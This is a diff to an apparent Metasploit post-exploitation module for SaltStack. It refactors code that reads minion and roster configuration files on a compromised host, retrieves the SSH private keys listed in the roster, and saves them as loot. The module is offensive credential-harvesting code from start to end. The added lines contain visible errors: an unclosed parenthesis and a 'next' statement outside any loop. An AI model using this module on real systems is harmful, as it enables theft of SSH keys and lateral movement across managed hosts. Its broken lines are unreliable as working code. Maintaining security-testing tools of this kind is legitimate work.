@@ -27,8 +27,9 @@ class MetasploitModule < Msf::Post
   def minion
     # XXX ask salt for minion file?
     [ '/usr/local/etc/salt/minion', # freebsd
-      '/etc/salt/minion']. each do |file|
-      minion = YAML.load(file_read(file))
+      '/etc/salt/minion']. each do |config|
+      next unless file?(config)
+      minion = YAML.load(read_file(config))
       if minion['master']
         minion['master'].each do |master|
           print_good("Minion master: #{master}")
@@ -78,7 +79,9 @@ class MetasploitModule < Msf::Post
     # XXX ask salt where the roster file is
     # https://docs.saltstack.com/en/latest/topics/ssh/roster.html
     priv_to_retrieve = []
-    minions = YAML.load(file_read('/etc/salt/roster'))
+    config = '/etc/salt/roster'
+    next unless file?(config)
+    minions = YAML.load(read_file(config)
     minions.each do |minion|
       host = minion['host']
       user = minion['user']
@@ -94,13 +97,16 @@ class MetasploitModule < Msf::Post
     store_path = store_loot('saltstack_roster', "application/x-yaml", session, minion.to_yaml, "roster.yaml", "SaltStack Roster File")
     print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
     priv_to_retrieve.each do |f|
-      input = file_read(f)
+      input = read_file(f)
       store_path = store_loot('ssh_key', "plain/txt", session, input, "salt-ssh.rsa", "SaltStack SSH Private Key")
       print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
     end
   end
 
   def run
+    if session.platform == 'windows'
+      fail_with(Failure::Unknown, 'This module does not support windows')
+    end
     minion
     master
   end
